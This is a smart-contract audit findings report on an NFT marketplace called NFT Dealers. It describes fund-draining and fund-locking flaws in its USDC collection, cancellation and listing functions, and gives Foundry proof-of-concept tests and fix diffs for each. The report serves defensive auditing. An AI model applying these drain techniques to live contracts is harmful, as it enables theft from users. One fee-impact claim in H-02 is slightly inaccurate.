# NFT Dealers - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Repeated calls to `collectUsdcFromSelling` drain all contract USDC](#H-01)
    - ### [H-02. `uint32` price type caps listings at ~4294 USDC and makes 5% fee tier unreachable](#H-02)
- ## Medium Risk Findings
    - ### [M-01. `collectUsdcFromSelling` callable after `cancelListing` enables theft without any sale](#M-01)
    - ### [M-02. Re-listing a sold token overwrites original seller's uncollected proceeds](#M-02)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #58

### Dates: Mar 12th, 2026 - Mar 19th, 2026

[See more contest details here](https://codehawks.cyfrin.io/c/2026-03-nft-dealers)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 2
- Medium: 2
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Repeated calls to `collectUsdcFromSelling` drain all contract USDC            



# Description

* `collectUsdcFromSelling` is designed to be called once by the seller after their NFT is sold, transferring `price - fees + collateral` to the seller and recording the fee for the owner.

* The function never zeroes `listing.price`, `listing.seller`, or `collateralForMinting[tokenId]` after disbursement, and sets no "collected" flag. The only guards are `onlySeller` and `require(!listing.isActive)` — both remain permanently true after a sale, so the seller can call the function an unlimited number of times, draining the entire USDC balance of the contract. Additionally, `usdc.safeTransfer(address(this), fees)` is a self-transfer no-op that does nothing.

```solidity
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
@>  require(!listing.isActive, "Listing must be inactive to collect USDC");
    // no "already collected" check

    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees;
@>  uint256 collateralToReturn = collateralForMinting[listing.tokenId]; // never zeroed

    totalFeesCollected += fees;
    amountToSeller += collateralToReturn;
@>  usdc.safeTransfer(address(this), fees); // self-transfer, no-op
@>  usdc.safeTransfer(msg.sender, amountToSeller); // called unlimited times
}
```

## Risk

**Likelihood**:

* Any seller whose listing was bought can call this function again at any time, as `isActive` stays `false` and no collected flag is ever set.

* No admin action or special condition is required — a regular whitelisted user triggers this immediately after their first legitimate collection.

**Impact**:

* Complete drainage of all USDC held by the contract, including collateral of other minters and sale proceeds of other sellers.

* Other users permanently lose their collateral and/or sale proceeds.

## Proof of Concept

Paste this function inside `NFTDealersTest` in `test/NFTDealersTest.t.sol` and run:
`forge test --match-test testPoC_UnlimitedDrainViaCollectUsdcFromSelling -vvvv`

```solidity
function testPoC_UnlimitedDrainViaCollectUsdcFromSelling() public {
    address alice = makeAddr("alice");
    address buyer = makeAddr("buyer");

    usdc.mint(alice, 20e6);
    usdc.mint(buyer, 100e6);

    vm.prank(owner);
    nftDealers.revealCollection();
    vm.prank(owner);
    nftDealers.whitelistWallet(alice);

    // 7 victims mint — lock 7*20e6 = 140e6 of collateral in the contract
    for (uint256 i = 0; i < 7; i++) {
        address victim = makeAddr(string.concat("victim", vm.toString(i)));
        usdc.mint(victim, 20e6);
        vm.prank(owner);
        nftDealers.whitelistWallet(victim);
        vm.startPrank(victim);
        usdc.approve(address(nftDealers), 20e6);
        nftDealers.mintNft();
        vm.stopPrank();
    }

    // Alice mints (tokenId = 8) and lists at 100 USDC
    vm.startPrank(alice);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();               // tokenId = 8
    nftDealers.list(8, uint32(100e6));
    vm.stopPrank();

    // Buyer purchases Alice's NFT
    vm.startPrank(buyer);
    usdc.approve(address(nftDealers), 100e6);
    nftDealers.buy(8);
    vm.stopPrank();

    // Contract holds: 8*20e6 (collateral) + 100e6 (buyer) = 260e6
    assertEq(usdc.balanceOf(address(nftDealers)), 260e6);

    // Alice collects legitimately once
    // fees = 100e6 * 1% = 1e6; payout = 99e6 + 20e6 (collateral) = 119e6
    vm.prank(alice);
    nftDealers.collectUsdcFromSelling(8);
    uint256 contractAfterFirst = usdc.balanceOf(address(nftDealers)); // 260e6 - 119e6 = 141e6

    // Alice collects again — listing.price and collateralForMinting were never cleared
    vm.prank(alice);
    nftDealers.collectUsdcFromSelling(8); // succeeds: 141e6 > 119e6

    // Alice received 238e6 total — 119e6 stolen from victims' collateral
    assertEq(usdc.balanceOf(alice), 238e6);
    assertEq(usdc.balanceOf(address(nftDealers)), contractAfterFirst - 119e6);
}
```

## Recommended Mitigation

```diff
  function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
      Listing memory listing = s_listings[_listingId];
      require(!listing.isActive, "Listing must be inactive to collect USDC");
+     require(listing.price > 0, "Already collected");

      uint256 fees = _calculateFees(listing.price);
      uint256 amountToSeller = listing.price - fees;
      uint256 collateralToReturn = collateralForMinting[listing.tokenId];

      totalFeesCollected += fees;
      amountToSeller += collateralToReturn;
-     usdc.safeTransfer(address(this), fees);
+     s_listings[_listingId].price = 0;
+     s_listings[_listingId].seller = address(0);
+     collateralForMinting[listing.tokenId] = 0;
      usdc.safeTransfer(msg.sender, amountToSeller);
  }
```

## <a id='H-02'></a>H-02. `uint32` price type caps listings at ~4294 USDC and makes 5% fee tier unreachable            



## Description

* The protocol implements a tiered fee structure: 1% for prices up to 1,000 USDC, 3% for up to 10,000 USDC, and 5% above 10,000 USDC. USDC uses 6 decimal places, so `10_000 USDC = 10_000e6 = 10_000_000_000`.

* `Listing.price` is declared as `uint32`, whose maximum value is `4,294,967,295` (~4294 USDC with 6 decimals). This is less than `MID_FEE_THRESHOLD` (`10_000e6 = 10_000_000_000`), making the `HIGH_FEE_BPS` (5%) tier permanently unreachable. Furthermore, `list()` and `updatePrice()` accept `uint32 _price`, silently truncating any value above `uint32.max` passed by the caller. The marketplace cannot support NFT sales above \~4294 USDC.

```solidity
uint256 private constant MID_FEE_THRESHOLD = 10_000e6; // 10_000_000_000
uint32  private constant HIGH_FEE_BPS = 500;            // 5%, unreachable

struct Listing {
    address seller;
@>  uint32 price;    // max 4_294_967_295 < MID_FEE_THRESHOLD (10_000_000_000)
    address nft;
    uint256 tokenId;
    bool isActive;
}

@> function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted { ... }
@> function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_listingId) { ... }

function _calculateFees(uint256 _price) internal pure returns (uint256) {
    if (_price <= LOW_FEE_THRESHOLD) {
        return (_price * LOW_FEE_BPS) / MAX_BPS;
    } else if (_price <= MID_FEE_THRESHOLD) {
        return (_price * MID_FEE_BPS) / MAX_BPS;
    }
@>  return (_price * HIGH_FEE_BPS) / MAX_BPS; // dead code, never reached
}
```

## Risk

**Likelihood**:

* This is a constant design flaw present from deployment — it affects every listing on the platform from day one.

* Any seller trying to list an NFT for more than \~4294 USDC is silently limited or reverted, depending on how the caller encodes the value.

**Impact**:

* The marketplace cannot support high-value NFT sales above \~4294 USDC, severely limiting the platform's use case.

* The 5% fee tier is permanently dead code — the protocol consistently under-collects fees on all sales in the 1000–4294 USDC range (charged 3% instead of up to 5%).

## Proof of Concept

Paste this function inside `NFTDealersTest` in `test/NFTDealersTest.t.sol` and run:
`forge test --match-test testPoC_Uint32PriceHighFeeTierUnreachable -vvvv`

```solidity
function testPoC_Uint32PriceHighFeeTierUnreachable() public view {
    uint256 maxListablePrice = uint256(type(uint32).max); // 4_294_967_295 ~ 4294 USDC
    uint256 midFeeThreshold  = 10_000e6;                 // 10_000_000_000

    // 1. The maximum price storable in Listing.price is below MID_FEE_THRESHOLD
    assertLt(maxListablePrice, midFeeThreshold);

    // 2. At the highest possible listing price, fees are still 3% (MID), never 5% (HIGH)
    uint256 fees            = nftDealers.calculateFees(maxListablePrice);
    uint256 expectedMidFee  = (maxListablePrice * 300) / 10_000; // 3%
    uint256 expectedHighFee = (maxListablePrice * 500) / 10_000; // 5%

    assertEq(fees, expectedMidFee);     // 3% applied
    assertNotEq(fees, expectedHighFee); // 5% never reached

    // 3. Attempting to pass 15_000 USDC as uint32 silently truncates
    uint256 desiredPrice  = 15_000e6;          // 15_000_000_000
    uint32  truncatedPrice = uint32(desiredPrice); // silent wrap: 15_000_000_000 % 2^32 = 1_215_752_192
    assertNotEq(uint256(truncatedPrice), desiredPrice); // stored price is wrong
}
```

## Recommended Mitigation

```diff
  struct Listing {
      address seller;
-     uint32 price;
+     uint256 price;
      address nft;
      uint256 tokenId;
      bool isActive;
  }
```

```diff
- function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
+ function list(uint256 _tokenId, uint256 _price) external onlyWhitelisted {
```

```diff
- function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_listingId) {
+ function updatePrice(uint256 _listingId, uint256 _newPrice) external onlySeller(_listingId) {
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. `collectUsdcFromSelling` callable after `cancelListing` enables theft without any sale            



## Description

* `cancelListing` allows a seller to delist their NFT and reclaim their minting collateral. After cancellation, `isActive` is set to `false` and collateral is returned via `safeTransfer`.

* `cancelListing` only sets `isActive = false` but leaves `listing.price` and `listing.seller` intact. Since `collectUsdcFromSelling` only checks `!isActive` and `msg.sender == seller`, a seller can cancel their listing (reclaiming collateral) and then call `collectUsdcFromSelling` to additionally receive `price - fees` — even though no buyer ever paid that amount. Combined with the missing state cleanup (Finding #1), this can be called repeatedly to drain the entire contract.

```solidity
function cancelListing(uint256 _listingId) external {
    Listing memory listing = s_listings[_listingId];
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller == msg.sender, "Only seller can cancel listing");

@>  s_listings[_listingId].isActive = false; // price and seller remain intact
    activeListingsCounter--;

    usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
    collateralForMinting[listing.tokenId] = 0;

    emit NFT_Dealers_ListingCanceled(_listingId);
}

function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
@>  require(!listing.isActive, "Listing must be inactive to collect USDC"); // passes after cancel
    // no check that a sale actually occurred
    ...
@>  usdc.safeTransfer(msg.sender, amountToSeller); // sends price-fees despite no buyer
}
```

## Risk

**Likelihood**:

* Any whitelisted seller who has ever created a listing can exploit this — cancellation is a normal user action freely available to all participants.

* The exploit requires no special timing or external conditions: cancel and immediately call `collectUsdcFromSelling`.

**Impact**:

* Seller drains `price - fees` per call from funds deposited by other users (other minters' collateral and sale proceeds of other sellers).

* Compounded with Finding #1 (no state reset), the seller can call repeatedly until the contract is empty.

## Proof of Concept

Paste this function inside `NFTDealersTest` in `test/NFTDealersTest.t.sol` and run:
`forge test --match-test testPoC_CollectAfterCancel -vvvv`

```solidity
function testPoC_CollectAfterCancel() public {
    address alice = makeAddr("alice");

    usdc.mint(alice, 20e6);

    vm.prank(owner);
    nftDealers.revealCollection();
    vm.prank(owner);
    nftDealers.whitelistWallet(alice);

    // 5 victims mint — lock 5*20e6 = 100e6 of collateral in the contract
    for (uint256 i = 0; i < 5; i++) {
        address victim = makeAddr(string.concat("victim", vm.toString(i)));
        usdc.mint(victim, 20e6);
        vm.prank(owner);
        nftDealers.whitelistWallet(victim);
        vm.startPrank(victim);
        usdc.approve(address(nftDealers), 20e6);
        nftDealers.mintNft();
        vm.stopPrank();
    }

    // Alice mints (tokenId = 6) and lists at 100 USDC
    vm.startPrank(alice);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();               // tokenId = 6
    nftDealers.list(6, uint32(100e6));

    // Alice cancels — recovers her 20e6 collateral; listing.price stays intact
    nftDealers.cancelListing(6);
    vm.stopPrank();

    // Contract holds: 5*20e6 = 100e6 (victims' collateral, alice's was returned)
    assertEq(usdc.balanceOf(alice), 20e6);
    assertEq(usdc.balanceOf(address(nftDealers)), 100e6);

    // Alice calls collectUsdcFromSelling — no buyer ever paid!
    // listing.isActive = false (from cancel) + seller = alice → passes all checks
    vm.prank(alice);
    nftDealers.collectUsdcFromSelling(6);

    // Alice stole price - fees = 100e6 - 1e6 = 99e6 from victims' collateral
    assertEq(usdc.balanceOf(alice), 20e6 + 99e6); // 119e6
    assertEq(usdc.balanceOf(address(nftDealers)), 100e6 - 99e6); // 1e6 left
}
```

## Recommended Mitigation

```diff
  function cancelListing(uint256 _listingId) external {
      Listing memory listing = s_listings[_listingId];
      if (!listing.isActive) revert ListingNotActive(_listingId);
      require(listing.seller == msg.sender, "Only seller can cancel listing");

-     s_listings[_listingId].isActive = false;
+     delete s_listings[_listingId];
      activeListingsCounter--;

      usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
      collateralForMinting[listing.tokenId] = 0;

      emit NFT_Dealers_ListingCanceled(_listingId);
  }
```

## <a id='M-02'></a>M-02. Re-listing a sold token overwrites original seller's uncollected proceeds            



## Description

* After a successful sale via `buy()`, the original seller is expected to call `collectUsdcFromSelling` to receive their `price - fees + collateral`. The function uses `onlySeller(_listingId)` which checks `s_listings[_listingId].seller == msg.sender`.

* Listings are keyed by `tokenId` (`s_listings[_tokenId]`). When the buyer becomes the new owner and calls `list()` for the same `tokenId`, the new listing overwrites `s_listings[tokenId]` entirely — including the `seller` field. The original seller's address is now replaced with the buyer's address, permanently failing the `onlySeller` check and locking the original seller's sale proceeds and collateral in the contract forever. The only guard in `list()` is `isActive == false`, which is already satisfied after a sale.

```solidity
function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
    require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
    require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
@>  require(s_listings[_tokenId].isActive == false, "NFT is already listed"); // no check for uncollected proceeds

    listingsCounter++;
    activeListingsCounter++;

@>  s_listings[_tokenId] =                          // overwrites original seller's listing
        Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});
    emit NFT_Dealers_Listed(msg.sender, listingsCounter);
}

modifier onlySeller(uint256 _listingId) {
@>  require(s_listings[_listingId].seller == msg.sender, "Only seller can call this function");
    // original seller fails here after overwrite
    _;
}
```

## Risk

**Likelihood**:

* The buyer calls `list()` immediately after purchase — a natural marketplace action for reselling an NFT.

* No special conditions required: the buyer just needs to be whitelisted (which they are, since they had to be whitelisted to interact with the contract).

**Impact**:

* Original seller permanently loses their sale proceeds (`price - fees`) and minting collateral (`lockAmount`).

* Funds remain locked in the contract with no recovery path.

## Proof of Concept

Paste this function inside `NFTDealersTest` in `test/NFTDealersTest.t.sol` and run:
`forge test --match-test testPoC_RelistOverwritesOriginalSellerProceeds -vvvv`

```solidity
function testPoC_RelistOverwritesOriginalSellerProceeds() public {
    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");

    usdc.mint(alice, 20e6);
    usdc.mint(bob,  100e6); // to buy alice's NFT

    vm.prank(owner);
    nftDealers.revealCollection();
    vm.startPrank(owner);
    nftDealers.whitelistWallet(alice);
    nftDealers.whitelistWallet(bob); // bob needs whitelist to re-list
    vm.stopPrank();

    // Alice mints (tokenId = 1) and lists at 100 USDC
    vm.startPrank(alice);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();
    nftDealers.list(1, uint32(100e6));
    vm.stopPrank();

    // Bob buys Alice's NFT
    vm.startPrank(bob);
    usdc.approve(address(nftDealers), 100e6);
    nftDealers.buy(1);
    vm.stopPrank();

    // isActive = false, alice has not yet collected her proceeds
    // Bob immediately re-lists the same tokenId — overwrites s_listings[1].seller
    vm.prank(bob);
    nftDealers.list(1, uint32(50e6)); // s_listings[1].seller = bob now

    // Alice tries to collect her legitimate sale proceeds
    vm.prank(alice);
    vm.expectRevert("Only seller can call this function");
    nftDealers.collectUsdcFromSelling(1);

    // Alice's proceeds (99e6) and collateral (20e6) are permanently locked
    assertEq(usdc.balanceOf(alice), 0);
    assertGt(usdc.balanceOf(address(nftDealers)), 0);
}
```

## Recommended Mitigation

```diff
- function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
+ function list(uint256 _tokenId, uint256 _price) external onlyWhitelisted {
      require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
      require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
-     require(s_listings[_tokenId].isActive == false, "NFT is already listed");
+     require(s_listings[_tokenId].isActive == false && s_listings[_tokenId].price == 0, "NFT has pending claim or is listed");
      require(_price > 0, "Price must be greater than 0");

      listingsCounter++;
      activeListingsCounter++;

      s_listings[_tokenId] =
          Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});
      emit NFT_Dealers_Listed(msg.sender, listingsCounter);
  }
```





